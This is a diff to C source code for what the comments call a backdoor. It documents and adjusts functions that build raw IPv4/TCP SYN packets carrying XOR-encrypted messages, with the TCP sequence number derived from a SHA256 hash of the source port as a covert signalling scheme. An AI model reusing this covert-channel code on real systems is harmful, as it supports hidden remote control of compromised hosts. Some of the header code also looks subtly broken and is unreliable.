@@ -10,7 +10,19 @@
 #include <time.h>
 #include <unistd.h>
 
-void send_message_to_ip(const struct in_addr address, unsigned short port, char *msg, int msg_len)
+/*
+ * Sends the the given message to the given address. The message is sent according to the protocol
+ * used by the backdoor. The msg is encrypted using XOR and the TCP sequence number is the first
+ * 4B of the SHA256 hash of the source port.
+ *
+ * Params:
+ *      const struct in_addr address: The address of the backdoor.
+ *      const unsigned short port: The value to be used for the TCP source port. The TCP sequence number
+ *                                 will be derived from this.
+ *      const char *msg: The message to encrypt and send.
+ *      const int msg_len: The length of the message to send.
+ */
+void send_message_to_ip(const struct in_addr address, const unsigned short port, char *msg, int msg_len)
 {
     const int SEND_FLAGS = 0;
     int sock;
@@ -32,6 +44,8 @@ void send_message_to_ip(const struct in_addr address, unsigned short port, char 
     // create tcp header
     fill_tcphdr(&send_tcp.tcp, rand() & 0xFFFF, port);
     fill_tcp_checksum(&send_tcp);
+    hdr_len = (send_tcp.ip.ihl * 4) + (send_tcp.tcp.doff * 4);
+    send_tcp.ip.tot_len = htons(hdr_len);
 
     // create sockaddr
     sin.sin_family = AF_INET;
@@ -39,7 +53,6 @@ void send_message_to_ip(const struct in_addr address, unsigned short port, char 
     sin.sin_addr.s_addr = send_tcp.ip.daddr;
 
     // create the entire packet
-    hdr_len = (send_tcp.ip.ihl * 4) + (send_tcp.tcp.doff * 4);
     packet_len = hdr_len + msg_len;
     if ((packet = (char *)malloc(packet_len)))
     {
@@ -58,6 +71,15 @@ void send_message_to_ip(const struct in_addr address, unsigned short port, char 
     close(sock);
 }
 
+/*
+ * Fills the IPv4 header structure. Things of note:
+ *      - The size is the default size with no no options. (20B)
+ *      - The ID is random.
+ *
+ * Params:
+ *      struct iphdr* hdr: The IPv4 header structure to fill.
+ *      const struct in_addr address; The destination address to use.
+ */
 void fill_iphdr(struct iphdr* hdr, const struct in_addr address)
 {
     struct in_addr src_addr;
@@ -66,7 +88,6 @@ void fill_iphdr(struct iphdr* hdr, const struct in_addr address)
     hdr->ihl = 5;
     hdr->version = 4;
     hdr->tos = 0;
-    hdr->tot_len = htons(40);
     hdr->id = (int)(255.0 * rand() / (RAND_MAX + 1.0));
     hdr->frag_off = 0;
     hdr->ttl = 64;
@@ -77,6 +98,17 @@ void fill_iphdr(struct iphdr* hdr, const struct in_addr address)
     hdr->check = in_cksum((unsigned short *)hdr, hdr->ihl * 5);
 }
 
+/*
+ * Fills the TCP header structure. Things of note:
+ *      - The size is the default size with no options. (20B)
+ *      - The sequence number is derived from the source port number.
+ *      - The packet is set as a SYN packet.
+ *
+ * Params:
+ *      struct tcphdr* hdr: The TCP header structure to fill.
+ *      const short src_port: The source port to use.
+ *      const shrot dst_port: The destination port to use.
+ */
 void fill_tcphdr(struct tcphdr* hdr, const short src_port, const short dst_port)
 {
     hdr->source = htons(src_port);
@@ -99,6 +131,12 @@ void fill_tcphdr(struct tcphdr* hdr, const short src_port, const short dst_port)
     hdr->urg_ptr = 0;
 }
 
+/**
+ * Caclulates and populates the TCP checksum field.
+ *
+ * Params:
+ *      struct ip_tcp_hdr* hdr: The IPv4 and TCP header to checksum.
+ */
 void fill_tcp_checksum(struct ip_tcp_hdr* hdr)
 {
     struct pseudo_header pHeader;
